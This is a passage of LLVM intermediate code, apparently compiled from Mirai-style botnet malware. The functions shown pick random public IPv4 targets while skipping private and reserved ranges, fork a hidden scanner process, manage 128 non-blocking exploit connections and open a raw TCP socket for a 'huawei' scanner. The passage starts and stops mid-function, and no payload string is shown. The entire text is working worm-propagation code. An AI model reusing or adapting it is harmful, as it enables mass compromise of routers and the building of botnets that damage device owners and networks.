; <label>:278:                                    ; preds = %271
  %.pr147 = load i32, i32* %97, align 4
  %279 = icmp eq i32 %.pr147, 11
  br i1 %279, label %.loopexit.loopexit, label %280

; <label>:280:                                    ; preds = %.thread148, %278
  %281 = load i32, i32* %260, align 8
  %282 = icmp eq i32 %281, 3
  %283 = load i32, i32* %211, align 8
  %284 = call i32 @close(i32 %283) #8
  br i1 %282, label %285, label %288

; <label>:285:                                    ; preds = %280
  call fastcc void @exploit_setup_connection(%struct.exploit_scanner_connection* nonnull %210)
  br label %.backedge

.backedge:                                        ; preds = %285, %289
  %286 = load i32, i32* %260, align 8
  %287 = icmp eq i32 %286, 0
  br i1 %287, label %.loopexit.loopexit, label %267

; <label>:288:                                    ; preds = %280
  store i32 -1, i32* %211, align 8
  store i32 0, i32* %260, align 8
  call void @util_zero(i8* nonnull %264, i32 256)
  br label %.loopexit

; <label>:289:                                    ; preds = %271
  %290 = load i32, i32* %263, align 4
  %291 = add nsw i32 %290, %277
  store i32 %291, i32* %263, align 4
  %292 = load i32, i32* @exploit_fake_time, align 4
  store i32 %292, i32* %266, align 4
  %293 = call i32 @util_strlen(i8* nonnull %264)
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 6, i64 %294
  store i8 0, i8* %295, align 1
  br label %.backedge

.loopexit.loopexit:                               ; preds = %278, %.backedge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %249, %288, %207, %245, %241, %233
  %296 = load i32, i32* %1, align 4
  %297 = add nsw i32 %296, 1
  store i32 %297, i32* %1, align 4
  %298 = icmp slt i32 %297, 128
  br i1 %298, label %207, label %.loopexit150.loopexit
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_random_ip() unnamed_addr #1 {
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %1 = tail call i32 @rand_next()
  %2 = tail call i64 @time(i64* null) #8
  %3 = trunc i64 %2 to i32
  tail call void @srand(i32 %3) #8
  %4 = lshr i32 %1, 8
  %trunc = trunc i32 %1 to i8
  switch i8 %trunc, label %18 [
    i8 127, label %.critedge.backedge
    i8 0, label %.critedge.backedge
    i8 3, label %.critedge.backedge
    i8 15, label %.critedge.backedge
    i8 16, label %.critedge.backedge
    i8 56, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 -64, label %5
    i8 -84, label %8
    i8 100, label %11
    i8 -87, label %14
    i8 -58, label %15
  ]

; <label>:5:                                      ; preds = %.critedge
  %6 = and i32 %4, 255
  %7 = icmp eq i32 %6, 168
  br i1 %7, label %.critedge.backedge, label %switch.early.test.thread

; <label>:8:                                      ; preds = %.critedge
  %9 = and i32 %4, 240
  %10 = icmp eq i32 %9, 16
  br i1 %10, label %.critedge.backedge, label %switch.early.test.thread

; <label>:11:                                     ; preds = %.critedge
  %12 = and i32 %4, 255
  %.off = add nsw i32 %12, -64
  %13 = icmp ult i32 %.off, 63
  br i1 %13, label %.critedge.backedge, label %switch.early.test.thread

; <label>:14:                                     ; preds = %.critedge
  %.old = and i32 %4, 255
  %.old67 = icmp eq i32 %.old, 255
  br i1 %.old67, label %.critedge.backedge, label %switch.early.test.thread

.critedge.backedge:                               ; preds = %14, %5, %8, %11, %15, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %18, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = and i32 %4, 254
  %17 = icmp eq i32 %16, 18
  br i1 %17, label %.critedge.backedge, label %switch.early.test.thread

; <label>:18:                                     ; preds = %.critedge
  %19 = and i32 %1, 224
  %.old71 = icmp ugt i32 %19, 223
  br i1 %.old71, label %.critedge.backedge, label %switch.early.test

switch.early.test:                                ; preds = %18
  switch i8 %trunc, label %switch.early.test.thread [
    i8 -41, label %.critedge.backedge
    i8 -42, label %.critedge.backedge
    i8 55, label %.critedge.backedge
    i8 33, label %.critedge.backedge
    i8 30, label %.critedge.backedge
    i8 29, label %.critedge.backedge
    i8 28, label %.critedge.backedge
    i8 26, label %.critedge.backedge
    i8 22, label %.critedge.backedge
    i8 21, label %.critedge.backedge
    i8 11, label %.critedge.backedge
    i8 7, label %.critedge.backedge
    i8 6, label %.critedge.backedge
  ]

switch.early.test.thread:                         ; preds = %14, %5, %8, %11, %switch.early.test, %15
  %20 = tail call i32 @llvm.bswap.i32(i32 %1)
  %21 = tail call i32 @htonl(i32 %20) #12
  ret i32 %21
}

declare zeroext i16 @checksum_generic(i16*, i32) local_unnamed_addr #7

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) local_unnamed_addr #7

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @exploit_setup_connection(%struct.exploit_scanner_connection* nocapture) unnamed_addr #1 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = bitcast %struct.sockaddr_in* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 16, i32 4, i1 false)
  %4 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 0
  %5 = load i32, i32* %4, align 8
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %1
  %8 = tail call i32 @close(i32 %5) #8
  br label %9

; <label>:9:                                      ; preds = %1, %7
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #8
  store i32 %10, i32* %4, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %35, label %12

; <label>:12:                                     ; preds = %9
  %13 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 5
  store i32 0, i32* %13, align 4
  %14 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 6, i64 0
  tail call void @util_zero(i8* %14, i32 256)
  %15 = load i32, i32* %4, align 8
  %16 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 3, i32 0) #8
  %17 = or i32 %16, 2048
  %18 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %17) #8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 3
  %21 = load i32, i32* %20, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  store i32 %21, i32* %22, align 4
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 4
  %24 = load i16, i16* %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* @exploit_fake_time, align 4
  %27 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 1
  store i32 %26, i32* %27, align 4
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 2
  %29 = load i32, i32* %28, align 8
  %.off = add i32 %29, -3
  %switch = icmp ult i32 %.off, 2
  br i1 %switch, label %31, label %30

; <label>:30:                                     ; preds = %12
  store i32 1, i32* %28, align 8
  br label %31

; <label>:31:                                     ; preds = %12, %30
  %32 = load i32, i32* %4, align 8
  %33 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %32, %struct.sockaddr* nonnull %33, i32 16) #8
  br label %35

; <label>:35:                                     ; preds = %9, %31
  ret void
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #7

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @exploit_recv_strip_null(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = sext i32 %2 to i64
  %6 = tail call i64 @recv(i32 %0, i8* %1, i64 %5, i32 %3) #8
  %7 = trunc i64 %6 to i32
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = and i64 %6, 4294967295
  %min.iters.check = icmp ult i64 %wide.trip.count, 32
  br i1 %min.iters.check, label %.lr.ph.preheader77, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %n.mod.vf = and i64 %6, 31
  %n.vec = sub nsw i64 %wide.trip.count, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.lr.ph.preheader77, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %pred.store.continue76
  %index = phi i64 [ %index.next, %pred.store.continue76 ], [ 0, %vector.body.preheader ]
  %9 = getelementptr inbounds i8, i8* %1, i64 %index
  %10 = bitcast i8* %9 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %10, align 1
  %11 = getelementptr i8, i8* %9, i64 16
  %12 = bitcast i8* %11 to <16 x i8>*
  %wide.load14 = load <16 x i8>, <16 x i8>* %12, align 1
  %13 = icmp eq <16 x i8> %wide.load, zeroinitializer
  %14 = icmp eq <16 x i8> %wide.load14, zeroinitializer
  %15 = extractelement <16 x i1> %13, i32 0
  br i1 %15, label %pred.store.if, label %pred.store.continue

pred.store.if:                                    ; preds = %vector.body
  %16 = getelementptr inbounds i8, i8* %1, i64 %index
  store i8 65, i8* %16, align 1
  br label %pred.store.continue

pred.store.continue:                              ; preds = %pred.store.if, %vector.body
  %17 = extractelement <16 x i1> %13, i32 1
  br i1 %17, label %pred.store.if15, label %pred.store.continue16

pred.store.if15:                                  ; preds = %pred.store.continue
  %18 = or i64 %index, 1
  %19 = getelementptr inbounds i8, i8* %1, i64 %18
  store i8 65, i8* %19, align 1
  br label %pred.store.continue16

pred.store.continue16:                            ; preds = %pred.store.if15, %pred.store.continue
  %20 = extractelement <16 x i1> %13, i32 2
  br i1 %20, label %pred.store.if17, label %pred.store.continue18

pred.store.if17:                                  ; preds = %pred.store.continue16
  %21 = or i64 %index, 2
  %22 = getelementptr inbounds i8, i8* %1, i64 %21
  store i8 65, i8* %22, align 1
  br label %pred.store.continue18

pred.store.continue18:                            ; preds = %pred.store.if17, %pred.store.continue16
  %23 = extractelement <16 x i1> %13, i32 3
  br i1 %23, label %pred.store.if19, label %pred.store.continue20

pred.store.if19:                                  ; preds = %pred.store.continue18
  %24 = or i64 %index, 3
  %25 = getelementptr inbounds i8, i8* %1, i64 %24
  store i8 65, i8* %25, align 1
  br label %pred.store.continue20

pred.store.continue20:                            ; preds = %pred.store.if19, %pred.store.continue18
  %26 = extractelement <16 x i1> %13, i32 4
  br i1 %26, label %pred.store.if21, label %pred.store.continue22

pred.store.if21:                                  ; preds = %pred.store.continue20
  %27 = or i64 %index, 4
  %28 = getelementptr inbounds i8, i8* %1, i64 %27
  store i8 65, i8* %28, align 1
  br label %pred.store.continue22

pred.store.continue22:                            ; preds = %pred.store.if21, %pred.store.continue20
  %29 = extractelement <16 x i1> %13, i32 5
  br i1 %29, label %pred.store.if23, label %pred.store.continue24

pred.store.if23:                                  ; preds = %pred.store.continue22
  %30 = or i64 %index, 5
  %31 = getelementptr inbounds i8, i8* %1, i64 %30
  store i8 65, i8* %31, align 1
  br label %pred.store.continue24

pred.store.continue24:                            ; preds = %pred.store.if23, %pred.store.continue22
  %32 = extractelement <16 x i1> %13, i32 6
  br i1 %32, label %pred.store.if25, label %pred.store.continue26

pred.store.if25:                                  ; preds = %pred.store.continue24
  %33 = or i64 %index, 6
  %34 = getelementptr inbounds i8, i8* %1, i64 %33
  store i8 65, i8* %34, align 1
  br label %pred.store.continue26

pred.store.continue26:                            ; preds = %pred.store.if25, %pred.store.continue24
  %35 = extractelement <16 x i1> %13, i32 7
  br i1 %35, label %pred.store.if27, label %pred.store.continue28

pred.store.if27:                                  ; preds = %pred.store.continue26
  %36 = or i64 %index, 7
  %37 = getelementptr inbounds i8, i8* %1, i64 %36
  store i8 65, i8* %37, align 1
  br label %pred.store.continue28

pred.store.continue28:                            ; preds = %pred.store.if27, %pred.store.continue26
  %38 = extractelement <16 x i1> %13, i32 8
  br i1 %38, label %pred.store.if29, label %pred.store.continue30

pred.store.if29:                                  ; preds = %pred.store.continue28
  %39 = or i64 %index, 8
  %40 = getelementptr inbounds i8, i8* %1, i64 %39
  store i8 65, i8* %40, align 1
  br label %pred.store.continue30

pred.store.continue30:                            ; preds = %pred.store.if29, %pred.store.continue28
  %41 = extractelement <16 x i1> %13, i32 9
  br i1 %41, label %pred.store.if31, label %pred.store.continue32

pred.store.if31:                                  ; preds = %pred.store.continue30
  %42 = or i64 %index, 9
  %43 = getelementptr inbounds i8, i8* %1, i64 %42
  store i8 65, i8* %43, align 1
  br label %pred.store.continue32

pred.store.continue32:                            ; preds = %pred.store.if31, %pred.store.continue30
  %44 = extractelement <16 x i1> %13, i32 10
  br i1 %44, label %pred.store.if33, label %pred.store.continue34

pred.store.if33:                                  ; preds = %pred.store.continue32
  %45 = or i64 %index, 10
  %46 = getelementptr inbounds i8, i8* %1, i64 %45
  store i8 65, i8* %46, align 1
  br label %pred.store.continue34

pred.store.continue34:                            ; preds = %pred.store.if33, %pred.store.continue32
  %47 = extractelement <16 x i1> %13, i32 11
  br i1 %47, label %pred.store.if35, label %pred.store.continue36

pred.store.if35:                                  ; preds = %pred.store.continue34
  %48 = or i64 %index, 11
  %49 = getelementptr inbounds i8, i8* %1, i64 %48
  store i8 65, i8* %49, align 1
  br label %pred.store.continue36

pred.store.continue36:                            ; preds = %pred.store.if35, %pred.store.continue34
  %50 = extractelement <16 x i1> %13, i32 12
  br i1 %50, label %pred.store.if37, label %pred.store.continue38

pred.store.if37:                                  ; preds = %pred.store.continue36
  %51 = or i64 %index, 12
  %52 = getelementptr inbounds i8, i8* %1, i64 %51
  store i8 65, i8* %52, align 1
  br label %pred.store.continue38

pred.store.continue38:                            ; preds = %pred.store.if37, %pred.store.continue36
  %53 = extractelement <16 x i1> %13, i32 13
  br i1 %53, label %pred.store.if39, label %pred.store.continue40

pred.store.if39:                                  ; preds = %pred.store.continue38
  %54 = or i64 %index, 13
  %55 = getelementptr inbounds i8, i8* %1, i64 %54
  store i8 65, i8* %55, align 1
  br label %pred.store.continue40

pred.store.continue40:                            ; preds = %pred.store.if39, %pred.store.continue38
  %56 = extractelement <16 x i1> %13, i32 14
  br i1 %56, label %pred.store.if41, label %pred.store.continue42

pred.store.if41:                                  ; preds = %pred.store.continue40
  %57 = or i64 %index, 14
  %58 = getelementptr inbounds i8, i8* %1, i64 %57
  store i8 65, i8* %58, align 1
  br label %pred.store.continue42

pred.store.continue42:                            ; preds = %pred.store.if41, %pred.store.continue40
  %59 = extractelement <16 x i1> %13, i32 15
  br i1 %59, label %pred.store.if43, label %pred.store.continue44

pred.store.if43:                                  ; preds = %pred.store.continue42
  %60 = or i64 %index, 15
  %61 = getelementptr inbounds i8, i8* %1, i64 %60
  store i8 65, i8* %61, align 1
  br label %pred.store.continue44

pred.store.continue44:                            ; preds = %pred.store.if43, %pred.store.continue42
  %62 = extractelement <16 x i1> %14, i32 0
  br i1 %62, label %pred.store.if45, label %pred.store.continue46

pred.store.if45:                                  ; preds = %pred.store.continue44
  %63 = or i64 %index, 16
  %64 = getelementptr inbounds i8, i8* %1, i64 %63
  store i8 65, i8* %64, align 1
  br label %pred.store.continue46

pred.store.continue46:                            ; preds = %pred.store.if45, %pred.store.continue44
  %65 = extractelement <16 x i1> %14, i32 1
  br i1 %65, label %pred.store.if47, label %pred.store.continue48

pred.store.if47:                                  ; preds = %pred.store.continue46
  %66 = or i64 %index, 17
  %67 = getelementptr inbounds i8, i8* %1, i64 %66
  store i8 65, i8* %67, align 1
  br label %pred.store.continue48

pred.store.continue48:                            ; preds = %pred.store.if47, %pred.store.continue46
  %68 = extractelement <16 x i1> %14, i32 2
  br i1 %68, label %pred.store.if49, label %pred.store.continue50

pred.store.if49:                                  ; preds = %pred.store.continue48
  %69 = or i64 %index, 18
  %70 = getelementptr inbounds i8, i8* %1, i64 %69
  store i8 65, i8* %70, align 1
  br label %pred.store.continue50

pred.store.continue50:                            ; preds = %pred.store.if49, %pred.store.continue48
  %71 = extractelement <16 x i1> %14, i32 3
  br i1 %71, label %pred.store.if51, label %pred.store.continue52

pred.store.if51:                                  ; preds = %pred.store.continue50
  %72 = or i64 %index, 19
  %73 = getelementptr inbounds i8, i8* %1, i64 %72
  store i8 65, i8* %73, align 1
  br label %pred.store.continue52

pred.store.continue52:                            ; preds = %pred.store.if51, %pred.store.continue50
  %74 = extractelement <16 x i1> %14, i32 4
  br i1 %74, label %pred.store.if53, label %pred.store.continue54

pred.store.if53:                                  ; preds = %pred.store.continue52
  %75 = or i64 %index, 20
  %76 = getelementptr inbounds i8, i8* %1, i64 %75
  store i8 65, i8* %76, align 1
  br label %pred.store.continue54

pred.store.continue54:                            ; preds = %pred.store.if53, %pred.store.continue52
  %77 = extractelement <16 x i1> %14, i32 5
  br i1 %77, label %pred.store.if55, label %pred.store.continue56

pred.store.if55:                                  ; preds = %pred.store.continue54
  %78 = or i64 %index, 21
  %79 = getelementptr inbounds i8, i8* %1, i64 %78
  store i8 65, i8* %79, align 1
  br label %pred.store.continue56

pred.store.continue56:                            ; preds = %pred.store.if55, %pred.store.continue54
  %80 = extractelement <16 x i1> %14, i32 6
  br i1 %80, label %pred.store.if57, label %pred.store.continue58

pred.store.if57:                                  ; preds = %pred.store.continue56
  %81 = or i64 %index, 22
  %82 = getelementptr inbounds i8, i8* %1, i64 %81
  store i8 65, i8* %82, align 1
  br label %pred.store.continue58

pred.store.continue58:                            ; preds = %pred.store.if57, %pred.store.continue56
  %83 = extractelement <16 x i1> %14, i32 7
  br i1 %83, label %pred.store.if59, label %pred.store.continue60

pred.store.if59:                                  ; preds = %pred.store.continue58
  %84 = or i64 %index, 23
  %85 = getelementptr inbounds i8, i8* %1, i64 %84
  store i8 65, i8* %85, align 1
  br label %pred.store.continue60

pred.store.continue60:                            ; preds = %pred.store.if59, %pred.store.continue58
  %86 = extractelement <16 x i1> %14, i32 8
  br i1 %86, label %pred.store.if61, label %pred.store.continue62

pred.store.if61:                                  ; preds = %pred.store.continue60
  %87 = or i64 %index, 24
  %88 = getelementptr inbounds i8, i8* %1, i64 %87
  store i8 65, i8* %88, align 1
  br label %pred.store.continue62

pred.store.continue62:                            ; preds = %pred.store.if61, %pred.store.continue60
  %89 = extractelement <16 x i1> %14, i32 9
  br i1 %89, label %pred.store.if63, label %pred.store.continue64

pred.store.if63:                                  ; preds = %pred.store.continue62
  %90 = or i64 %index, 25
  %91 = getelementptr inbounds i8, i8* %1, i64 %90
  store i8 65, i8* %91, align 1
  br label %pred.store.continue64

pred.store.continue64:                            ; preds = %pred.store.if63, %pred.store.continue62
  %92 = extractelement <16 x i1> %14, i32 10
  br i1 %92, label %pred.store.if65, label %pred.store.continue66

pred.store.if65:                                  ; preds = %pred.store.continue64
  %93 = or i64 %index, 26
  %94 = getelementptr inbounds i8, i8* %1, i64 %93
  store i8 65, i8* %94, align 1
  br label %pred.store.continue66

pred.store.continue66:                            ; preds = %pred.store.if65, %pred.store.continue64
  %95 = extractelement <16 x i1> %14, i32 11
  br i1 %95, label %pred.store.if67, label %pred.store.continue68

pred.store.if67:                                  ; preds = %pred.store.continue66
  %96 = or i64 %index, 27
  %97 = getelementptr inbounds i8, i8* %1, i64 %96
  store i8 65, i8* %97, align 1
  br label %pred.store.continue68

pred.store.continue68:                            ; preds = %pred.store.if67, %pred.store.continue66
  %98 = extractelement <16 x i1> %14, i32 12
  br i1 %98, label %pred.store.if69, label %pred.store.continue70

pred.store.if69:                                  ; preds = %pred.store.continue68
  %99 = or i64 %index, 28
  %100 = getelementptr inbounds i8, i8* %1, i64 %99
  store i8 65, i8* %100, align 1
  br label %pred.store.continue70

pred.store.continue70:                            ; preds = %pred.store.if69, %pred.store.continue68
  %101 = extractelement <16 x i1> %14, i32 13
  br i1 %101, label %pred.store.if71, label %pred.store.continue72

pred.store.if71:                                  ; preds = %pred.store.continue70
  %102 = or i64 %index, 29
  %103 = getelementptr inbounds i8, i8* %1, i64 %102
  store i8 65, i8* %103, align 1
  br label %pred.store.continue72

pred.store.continue72:                            ; preds = %pred.store.if71, %pred.store.continue70
  %104 = extractelement <16 x i1> %14, i32 14
  br i1 %104, label %pred.store.if73, label %pred.store.continue74

pred.store.if73:                                  ; preds = %pred.store.continue72
  %105 = or i64 %index, 30
  %106 = getelementptr inbounds i8, i8* %1, i64 %105
  store i8 65, i8* %106, align 1
  br label %pred.store.continue74

pred.store.continue74:                            ; preds = %pred.store.if73, %pred.store.continue72
  %107 = extractelement <16 x i1> %14, i32 15
  br i1 %107, label %pred.store.if75, label %pred.store.continue76

pred.store.if75:                                  ; preds = %pred.store.continue74
  %108 = or i64 %index, 31
  %109 = getelementptr inbounds i8, i8* %1, i64 %108
  store i8 65, i8* %109, align 1
  br label %pred.store.continue76

pred.store.continue76:                            ; preds = %pred.store.if75, %pred.store.continue74
  %index.next = add i64 %index, 32
  %110 = icmp eq i64 %index.next, %n.vec
  br i1 %110, label %middle.block, label %vector.body, !llvm.loop !9

middle.block:                                     ; preds = %pred.store.continue76
  %cmp.n = icmp eq i64 %n.mod.vf, 0
  br i1 %cmp.n, label %.loopexit, label %.lr.ph.preheader77

.lr.ph.preheader77:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %indvars.iv.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %n.vec, %middle.block ]
  %111 = sub i64 %6, %indvars.iv.ph
  %112 = add nsw i64 %wide.trip.count, -1
  %113 = sub nsw i64 %112, %indvars.iv.ph
  %xtraiter = and i64 %111, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader77
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %118, %.lr.ph.prol.preheader
  %indvars.iv.prol = phi i64 [ %indvars.iv.next.prol, %118 ], [ %indvars.iv.ph, %.lr.ph.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %118 ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %114 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.prol
  %115 = load i8, i8* %114, align 1
  %116 = icmp eq i8 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %.lr.ph.prol
  store i8 65, i8* %114, align 1
  br label %118

; <label>:118:                                    ; preds = %117, %.lr.ph.prol
  %indvars.iv.next.prol = add nuw nsw i64 %indvars.iv.prol, 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !10

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %118
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader77, %.lr.ph.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ %indvars.iv.ph, %.lr.ph.preheader77 ], [ %indvars.iv.next.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %119 = icmp ult i64 %113, 3
  br i1 %119, label %.loopexit.loopexit, label %.lr.ph.preheader77.new

.lr.ph.preheader77.new:                           ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %136, %.lr.ph.preheader77.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader77.new ], [ %indvars.iv.next.3, %136 ]
  %120 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv
  %121 = load i8, i8* %120, align 1
  %122 = icmp eq i8 %121, 0
  br i1 %122, label %123, label %.lr.ph.178

; <label>:123:                                    ; preds = %.lr.ph
  store i8 65, i8* %120, align 1
  br label %.lr.ph.178

.lr.ph.178:                                       ; preds = %.lr.ph, %123
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %124 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next
  %125 = load i8, i8* %124, align 1
  %126 = icmp eq i8 %125, 0
  br i1 %126, label %127, label %.lr.ph.279

.loopexit.loopexit.unr-lcssa:                     ; preds = %136
  br label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph.prol.loopexit, %.loopexit.loopexit.unr-lcssa
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %middle.block, %4
  ret i32 %7

; <label>:127:                                    ; preds = %.lr.ph.178
  store i8 65, i8* %124, align 1
  br label %.lr.ph.279

.lr.ph.279:                                       ; preds = %127, %.lr.ph.178
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %128 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.1
  %129 = load i8, i8* %128, align 1
  %130 = icmp eq i8 %129, 0
  br i1 %130, label %131, label %.lr.ph.380

; <label>:131:                                    ; preds = %.lr.ph.279
  store i8 65, i8* %128, align 1
  br label %.lr.ph.380

.lr.ph.380:                                       ; preds = %131, %.lr.ph.279
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %132 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.2
  %133 = load i8, i8* %132, align 1
  %134 = icmp eq i8 %133, 0
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %.lr.ph.380
  store i8 65, i8* %132, align 1
  br label %136

; <label>:136:                                    ; preds = %135, %.lr.ph.380
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next.3, %wide.trip.count
  br i1 %exitcond.3, label %.loopexit.loopexit.unr-lcssa, label %.lr.ph, !llvm.loop !12
}

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define void @huawei_init() local_unnamed_addr #1 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.fd_set, align 8
  %3 = alloca %struct.fd_set, align 8
  %4 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %4 to %struct.timeval*
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca [1514 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %9 = tail call i32 @fork() #8
  store i32 %9, i32* @huawei_scanner_pid, align 4
  %10 = icmp sgt i32 %9, 0
  %11 = icmp eq i32 %9, -1
  %or.cond = or i1 %10, %11
  br i1 %or.cond, label %12, label %._crit_edge.lr.ph

; <label>:12:                                     ; preds = %0
  ret void

._crit_edge.lr.ph:                                ; preds = %0
  %13 = tail call i32 @util_local_addr()
  store i32 %13, i32* @LOCAL_ADDR, align 4
  tail call void @rand_init()
  %14 = tail call i64 @time(i64* null) #8
  %15 = trunc i64 %14 to i32
  store i32 %15, i32* @huawei_fake_time, align 4
  %16 = tail call noalias i8* @calloc(i64 128, i64 5416) #8
  store i8* %16, i8** bitcast (%struct.exploit_scanner_connection** @conn_table to i8**), align 8
  store i32 0, i32* %1, align 4
  %17 = getelementptr inbounds i8, i8* %16, i64 8
  %18 = bitcast i8* %17 to i32*
  store i32 0, i32* %18, align 8
  %19 = bitcast i8* %16 to i32*
  store i32 -1, i32* %19, align 8
  store i32 1, i32* %1, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.lr.ph, %._crit_edge
  %20 = phi i32 [ 1, %._crit_edge.lr.ph ], [ %25, %._crit_edge ]
  %.pre = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %.pre, i64 %21, i32 2
  store i32 0, i32* %22, align 8
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %.pre, i64 %21, i32 0
  store i32 -1, i32* %23, align 8
  %24 = load i32, i32* %1, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %1, align 4
  %26 = icmp slt i32 %25, 128
  br i1 %26, label %._crit_edge, label %._crit_edge196

._crit_edge196:                                   ; preds = %._crit_edge
  %27 = tail call i32 @socket(i32 2, i32 3, i32 6) #8
  store i32 %27, i32* @huawei_rsck, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %._crit_edge196
  tail call void @exit(i32 0) #14
  unreachable

; <label>:30:                                     ; preds = %._crit_edge196
